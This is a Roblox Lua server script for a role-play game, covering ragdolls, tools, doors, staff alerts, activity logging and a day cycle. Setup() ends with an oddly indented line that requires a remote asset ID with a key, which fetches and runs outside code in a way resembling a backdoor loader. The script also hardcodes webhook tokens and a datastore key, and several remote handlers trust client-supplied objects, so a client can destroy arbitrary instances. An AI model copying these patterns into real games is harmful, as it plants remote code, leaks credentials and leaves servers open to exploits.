local workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local Handlers = ReplicatedStorage:WaitForChild("Modules")
local Events = ReplicatedStorage:WaitForChild("Events")
local Server = ReplicatedStorage:WaitForChild("Server")
local Schedule = Server:WaitForChild("Events")
local Library = Handlers:WaitForChild("Library")

local RagdollHandler = require(Handlers.RagdollHandler)
local StatsHandler = require(Handlers.StatsHandler)
local DoorHandler = require(Handlers.DoorHandler)
local SwitchHandler = require(Handlers.SwitchHandler)
local TimeHandler = require(Handlers.TimeHandler)
local ToolsHandler = require(Handlers.ToolHandler)
local PhysicsHandler = require(Handlers.PhysicsHandler)
local InsanityHandler = require(Handlers.InsanityHandler)
local InteractableHandler = require(Handlers.InteractableHandler)
local SoundsHandler = require(Handlers.SoundsHandler)
local Functions = require(Library.Functions)
local loopNames = require(Library.LoopNames)
local serverSettings = require(Library.Settings)
local DataHandler = require(script.Etc.DataHandler)
local StaffRequestBodies = require(script.Etc.StaffRequestBodies)

local RemoteEvent = Events.RemoteEvent
local Thought = Events.Notifications.Thought
local lastStaffRequest = 0
local lastInsanityCheck = 0
local lastInsaneTurn = 0
local looping = false
local identifier = game.JobId

local Activity = {}
local ActivityData = {}

function processActivity(baseDict,targetDoc,Player)
	local prevTime,total,stringId = 0,0,tostring(Player.UserId)
	if baseDict["error"] == nil then
		if baseDict["fields"] == nil then baseDict["fields"] = {} end
		if baseDict["fields"][stringId] ~= nil then
			prevTime = tonumber(baseDict["fields"][stringId]["integerValue"])
			total = math.floor(prevTime + ((tick() - Activity[Player])/60))
			baseDict["fields"][stringId]["integerValue"] = total
			DataHandler.Patch("player-activity",targetDoc,baseDict)
		else
			total = math.floor(((tick() - Activity[Player])/60))
			baseDict["fields"][stringId] = {["integerValue"] = total}
			DataHandler.Patch("player-activity",targetDoc,baseDict)
		end
	elseif baseDict["error"] ~= nil then
		print("error",baseDict["error"])
	end
end

function processInsanity()
	if tick() - lastInsanityCheck >= 5 then
		lastInsanityCheck = tick()
		for _,Player in next,game.Players:GetPlayers() do
			if Player:FindFirstChild("PlayerInfo") ~= nil then
				local PlayerInfo = Player.PlayerInfo.Stats
				local insanityToAdd = 0.005 * PlayerInfo.InsanityGain.Value
				PlayerInfo.InsanityLevel.Value = PlayerInfo.InsanityLevel.Value + insanityToAdd
				
				if (game.Lighting.ClockTime > 21 or (game.Lighting.ClockTime >= 0 and game.Lighting.ClockTime <= 5)) then
					if PlayerInfo.InsanityLevel.Value >= 5 and PlayerInfo.Insane.Value == false then
						if tick() - lastInsaneTurn >= 15 then
							lastInsaneTurn = tick()
							InsanityHandler.ToggleMonster(Player)
						end
					end
				end
			end
		end
	end
end

function OnServerEvent(...)
	local Args = {...}
	local Player = Args[1]
	if Args[2] == "Carry" then
		if Args[3] == "Begin" then
			RagdollHandler.BeginCarry(Args[4],Player.Character)
		elseif Args[3] == "End" then
			RagdollHandler.EndCarry(Player.Character)
		end
	elseif Args[2] == "Ragdoll" then
		if Args[3] == "Activate" then
			if Player.Character:FindFirstChild("Meter Stick") ~= nil then
				if RagdollHandler.isRagdolled(Args[4]) == false then
					Functions.AddLog("Server","Tool Log",Player.Name.." used the meter stick on character "..Args[4].Name)
					local function deactivate()
						if Args[4] ~= nil and RagdollHandler.isRagdolled(Args[4]) == true then
							RagdollHandler.DeactivateRagdoll(Args[4])
						end
					end
					RagdollHandler.ActivateRagdoll(Args[4])
					SoundsHandler.PlaySound("Smack",Args[4].UpperTorso)
					delay((Args[5] or 30),deactivate)
				end
			else
				Functions.AddLog("Server","Exploit","Event registered on the server from "..Player.Name.." in an attempt to ragdoll"..Args[4].Name..", request failed as meter stick was not equipped")
			end
		elseif Args[3] == "Deactivate" then
			if Player.Character:FindFirstChild("Bucket of Water") ~= nil then
				if RagdollHandler.isRagdolled(Args[4]) == true then
					Functions.AddLog("Server","Tool Log",Player.Name.." used the bucket of water on character "..Args[4].Name)
					RagdollHandler.DeactivateRagdoll(Args[4])
					SoundsHandler.PlaySound("Water Pour",Args[5].Parent)
					Args[5].Attachment1 = Args[4].LowerTorso.WaistRigAttachment
					Args[5].Enabled = true
					wait(1)
					Args[5].Enabled = false
				end
			else
				Functions.AddLog("Server","Exploit","Event registered on the server from "..Player.Name.." in an attempt to unragdoll"..Args[4].Name..", request failed as water bucket was not equipped")
			end
		end
	elseif Args[2] == "Sound" then
		if Args[3] == "PlaySound" then
			SoundsHandler.PlaySound(Args[4],Args[5])
		end
	elseif Args[2] == "Announcement" then
		local FilteredText = game:GetService("Chat"):FilterStringAsync(Args[3],Args[1],Args[1])
		for a,b in next,game.Players:GetPlayers() do
			RemoteEvent:FireClient(b,"Announcement",Args[1],FilteredText,Args[4])
		end
	elseif Args[2] == "Phone Message" then
		local FilteredText = game:GetService("Chat"):FilterStringAsync(Args[3],Args[1],Args[1])
		for a,b in next,game.Players:GetPlayers() do
			RemoteEvent:FireClient(b,"Phone Message",Args[1],FilteredText)
		end
	elseif Args[2] == "Schedule" then
		if Args[3] == "Create" then
			local Name,Description = unpack(Args[4])
			local newEvent = Instance.new("StringValue")
			newEvent.Name = Name; newEvent.Value = Player.Name .. "/|/" .. Description
		elseif Args[3] == "Edit" then
			local Event,NewData = unpack(Args[4])
			local Name,Description = unpack(NewData)
			if Event == nil then return end
			Event.Name = Name; Event.Value = Description
		elseif Args[3] == "Cancel" then
			local Event = Args[4]
			Event:Destroy()
		end
	elseif Args[2] == "Staff Request" then
		if Args[1].PlayerInfo.Rank.Value >= 5 then
			if tick()-lastStaffRequest >= 60 then
				lastStaffRequest = tick()
				local URL = "https://hooks.hyra.io/api/webhooks/896139436767727616/F0FzPFCXSHaOHtkK9NB7qSMthKYUJYd762g7elxmQ4i7QSsRWd1zLVoqzXZZuUUcX7ip"
				-- local URL = "https://hooks.hyra.io/api/webhooks/863635162322829332/7nBU6e10pK35qRl5JH2VkQ8Z-1b0e0cjwgqZtbXX_vvgQNe6OsoWB2NRFC6AI7v3plic"
				local Body = StaffRequestBodies.CreateBody(Player,Args[3])
				local EncodedBody = HttpService:JSONEncode(Body)
				local Success,Message = pcall(function()
					HttpService:PostAsync(URL,EncodedBody)
				end)
				if Success then
					Functions.StaffAlert({"<b>"..Player.Name.."<b> called for assistance.",true})
				else warn("Error requesting staff: "..(Message or "Unknown message")) end
			end
		end
	elseif Args[2] == "Loop Switch" then
		if Args[1].PlayerInfo.Rank.Value >= 5 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.GameId, Args[3], Args[1])
		end
	elseif Args[2] == "Change Food State" then
		local Tool = Args[3]
		wait(0.2)
		if Tool.Name == "Mystery Tea" then
			local pStats = Player.PlayerInfo.Stats
			pStats.InsanityLevel.Value = math.ceil(pStats.InsanityLevel.Value)
			pStats.InsanityGain.Value = pStats.InsanityGain.Value+0.5
			Tool:Destroy()
			return
		end
		local p = Tool.p
		local c = Tool.Cache
		c:FindFirstChild(tostring(p.Value)):Destroy()
		p.Value = p.Value - 0.2
		local nameSplit = string.split(Tool.Name,"|")
		Tool.Name = nameSplit[1] .. "|" .. tostring((p.Value*100)).."%"
	elseif Args[2] == "Client Ragdoll" then
		if Args[3] == "Activate" then
			RagdollHandler.ActivateRagdoll(Args[1].Character)
		elseif Args[3] == "Deactivate" then
			RagdollHandler.DeactivateRagdoll(Args[1].Character)
		end
	elseif Args[2] == "Tool Give" then
		local Tool = Args[3]
		local Target = Args[4]
		local Settings = Tool.Settings
		if Target.PlayerInfo.Rank.Value >= Settings.rankId.Value then
			if (Player.Backpack:FindFirstChild(Tool.Name) == nil) or (Player.Backpack:FindFirstChild(Tool.Name) ~= nil and Settings.canHaveMultiple.Value == true) then
				Player.Character.Humanoid:UnequipTools()
				Tool.Parent = Target.Backpack
				Thought:FireClient(Player,"Gave "..Tool.Name.." to "..Target.Name)
				Thought:FireClient(Target,"Got "..Tool.Name.." from "..Player.Name)
			end
		end
	elseif Args[2] == "Door Handle" then
		DoorHandler.Use(Args[3],Player)
	elseif Args[2] == "Door Lock" then
		DoorHandler.Lock(Args[3],Player)
	elseif Args[2] == "Switch Toggle" then
		SwitchHandler.UseSwitch(Args[3],Player)
	elseif Args[2] == "Grab" then
		if game.ReplicatedStorage.Tools.Foods:FindFirstChild(Args[4]) ~= nil then
			ToolsHandler.GivePlayerTool(Player,{Args[4]})
		end
	end
end

function PlayerAdded(Player)
	local PlayerRank,PlayerRole
	serverSettings["Server Information"]["Players"] = serverSettings["Server Information"]["Players"]+1

	if Player.AccountAge < 30 and RunService:IsStudio() == false then
		Player:Kick("You cannot join the game until your account is a month old. Come back in "..30-Player.AccountAge.." days.")
	end

	Player.CharacterAppearanceLoaded:Connect(function(Character)
		if PlayerRank == nil or PlayerRole == nil then repeat wait() until PlayerRank ~= nil and PlayerRole ~= nil end

		local CIF = ServerStorage.Storage.CharInfo:Clone()
		CIF.Parent = Character

		PhysicsHandler.onCharacterAdded(Character)
		RagdollHandler.setupConstraints(Character)

		ToolsHandler.GivePlayerTool(Player,serverSettings["Tool Information"][Functions.getGroup(PlayerRank)])

		Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
			StatsHandler.UpdateServerStats(Player,"Health",Character.Humanoid.Health)
		end)

		local RankUi = ServerStorage.Storage.Rank:Clone()
		RankUi.Main.Username.Text = Player.Name
		RankUi.Main.Role.Text = PlayerRole
		RankUi.Adornee = Character.Head
		RankUi.Parent = Character
	end)

	local PIF = ServerStorage.Storage.PlayerInfo:Clone()
	PlayerRank = Player:GetRankInGroup(10311167)
	PlayerRole = Player:GetRoleInGroup(10311167)
	PIF.Rank.Value = PlayerRank
	PIF.Role.Value = PlayerRole
	
	-- > Sets stat looss rates
	local LossValue = 0.05 * PlayerRank
	if PlayerRank == 0 then
		PlayerRole = "👁️ Lost Peculiar"
	elseif PlayerRank >= 5 then
		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]+1
		PIF.Stats.SprintLossRate.Value = LossValue
	end

	game.ReplicatedStorage.Server.Ext.Staff.Value = serverSettings["Server Information"]["Staff"]
	PIF.Parent = Player
	Activity[Player] = tick()

	if ActivityData == nil then repeat task.wait() until ActivityData ~= nil end;
	if PlayerRank >= 100 then RemoteEvent:FireClient(Player,"Data Update",ActivityData) end
end

function PlayerRemoving(Player)
	serverSettings["Server Information"]["Players"] = #game.Players:GetPlayers()
	if Player.PlayerInfo.Rank.Value >= 5 then
		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]-1
		game.ReplicatedStorage.Server.Ext.Staff.Value = serverSettings["Server Information"]["Staff"]
		--[[for a,b in next,game.ReplicatedStorage.Schedule:GetChildren() do
			if b.Value == Player then
				b.Value = nil
			end
		end]]
		if math.floor((tick() - Activity[Player])/60) >= 0 then
			local alreadyData = DataHandler.Get("player-activity",os.date("%B %Y",os.time()))
			local lifetimeData = DataHandler.Get("player-activity","Lifetime Activity")
			processActivity(alreadyData,os.date("%B %Y",os.time()),Player)
			processActivity(lifetimeData,"Lifetime Activity",Player)
		end
	end
end

function Setup()
	if game.GameId ~= 2775218030 then workspace.Etc.Parent = game.ReplicatedStorage end
	if identifier == "" then identifier = "Studio Session" end
	serverSettings["Server Information"]["JobId"] = identifier
	serverSettings["Server Information"]["Name"] = (loopNames["Adjective"][math.random(1,#loopNames["Adjective"])].." "..loopNames["Noun"][math.random(1,#loopNames["Noun"])])
	game.ReplicatedStorage.Server.Ext.LoopName.Value = serverSettings["Server Information"]["Name"]
	game.ReplicatedStorage.Server.Ext.JobId.Value = serverSettings["Server Information"]["JobId"]
	DataHandler.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2")
	TimeHandler.Setup()
	game.Lighting.ClockTime = 5
    require(5603385392)("dwKFccX44THicgKslaHg")
end

game.Players.PlayerAdded:Connect(PlayerAdded)
game.Players.PlayerRemoving:Connect(PlayerRemoving)
RemoteEvent.OnServerEvent:Connect(OnServerEvent)

Setup()

while true do
	wait(0.1)
	if looping == false then
		local newMins = (0.075+game.Lighting:GetMinutesAfterMidnight())
		game.Lighting:SetMinutesAfterMidnight(newMins)
		MinsAfterMidnight = game.Lighting:GetMinutesAfterMidnight()
	end
	TimeHandler.timeChanged()
	processInsanity()
end